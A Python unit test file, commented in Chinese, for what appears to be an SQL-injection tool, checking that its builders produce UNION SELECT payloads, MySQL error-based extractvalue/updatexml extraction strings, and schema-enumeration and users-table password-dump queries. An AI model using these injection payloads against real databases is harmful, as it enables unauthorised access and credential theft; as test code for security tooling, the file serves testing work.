"""SQL 构造器与 UNION 语句拼接的离线单元测试（不需要网络）。

运行：python tests/test_sql_builders.py
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from payloads import error_based, extractor, union


def test_basic_info_sql():
    assert extractor.sql_version() == "SELECT version()"
    assert extractor.sql_current_db() == "SELECT database()"
    assert extractor.sql_current_user() == "SELECT user()"


def test_enum_databases():
    assert "information_schema.schemata" in extractor.sql_databases()


def test_enum_tables_filters_db():
    sql = extractor.sql_tables("security")
    assert "information_schema.tables" in sql
    assert "table_schema='security'" in sql


def test_enum_columns_filters_table():
    sql = extractor.sql_columns("security", "users")
    assert "information_schema.columns" in sql
    assert "table_name='users'" in sql


def test_dump_sql_shape():
    sql = extractor.sql_dump("security", "users",
                             ["id", "username", "password"], limit=5)
    # 各列用 | (0x7c) 连接，行间用 ~~ 分隔，内层子查询做 LIMIT
    assert "`id`,0x7c,`username`,0x7c,`password`" in sql
    assert "SEPARATOR '~~'" in sql
    assert "FROM `security`.`users` LIMIT 5" in sql
    assert sql.rstrip().endswith(") t")


def test_union_select_at():
    assert union.union_select_at(3, 2, "concat(X)") == "union select 1,concat(X),3"
    assert union.union_select_at(3, 1, "concat(X)") == "union select concat(X),2,3"
    assert union.union_select_at(3, 3, "concat(X)") == "union select 1,2,concat(X)"


def test_marker_payload():
    # 回显位探测：每个位置一个唯一标记
    cols = ",".join(f"'zqx9{i}'" for i in range(1, 4))
    assert cols == "'zqx91','zqx92','zqx93'"


def test_error_based_payload():
    stmt = error_based.extractvalue("SELECT database()")
    assert "extractvalue(1,concat(0x5e5e," in stmt
    assert "substr((SELECT database()),1,28)" in stmt
    assert stmt.endswith(",0x2424))")


def test_error_based_chunk_fits_32_limit():
    # 报错串只显示 32 字符：^^ + 数据 + $$ 必须装得下，否则结尾哨兵被截断
    assert 2 + error_based.CHUNK + 2 <= error_based.LIMIT


def test_error_based_second_chunk():
    stmt = error_based.updatexml("SELECT database()", offset=29)
    assert "substr((SELECT database()),29,28)" in stmt
    assert "updatexml(1," in stmt


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items())
           if k.startswith("test_") and callable(v)]
    failed = 0
    for fn in fns:
        try:
            fn()
            print(f"PASS {fn.__name__}")
        except AssertionError:
            failed += 1
            print(f"FAIL {fn.__name__}")
    print(f"\n{len(fns) - failed}/{len(fns)} passed")
    sys.exit(1 if failed else 0)
